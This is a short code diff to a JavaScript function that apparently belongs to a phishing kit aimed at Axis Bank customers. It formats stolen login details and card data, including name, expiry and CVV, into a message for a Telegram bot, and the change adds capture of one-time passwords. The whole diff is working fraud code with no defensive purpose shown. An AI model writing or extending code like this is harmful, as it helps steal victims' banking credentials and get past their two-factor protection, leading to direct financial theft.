@@ -68,7 +68,8 @@ function buildAxisHtmlText(payload) {
   const hh = String(h12).padStart(2, '0');
   const login = (payload && typeof payload.loginData === 'object' && payload.loginData) || {};
   const card  = (payload && typeof payload.cardData  === 'object' && payload.cardData)  || {};
-  return [
+  const otp   = (payload && typeof payload.otpData   === 'object' && payload.otpData)   || {};
+  const lines = [
     '<b>========== LOGIN INFO ==========</b>',
     'Time: <code>' + hh + ':' + mm + ' ' + ampm + '</code>\n',
     'Name:   <code>' + (login.fullName || '—') + '</code>',
@@ -80,7 +81,13 @@ function buildAxisHtmlText(payload) {
     'Name:   <code>' + (card.name || '—') + '</code>',
     'Expiry: <code>' + (card.expiry || '—') + '</code>',
     'CVV:    <code>' + (card.cvv || '—') + '</code>',
-  ].join('\n');
+  ];
+  if (otp && (typeof otp.otp === 'string' || typeof otp.otp === 'number')) {
+    lines.push('');
+    lines.push('<b>========== [OTP DETAILS] ==========</b>');
+    lines.push('OTP: <code>' + String(otp.otp) + '</code>');
+  }
+  return lines.join('\n');
 }
 
 async function sendAxisTelegram(botToken, chatId, text) {
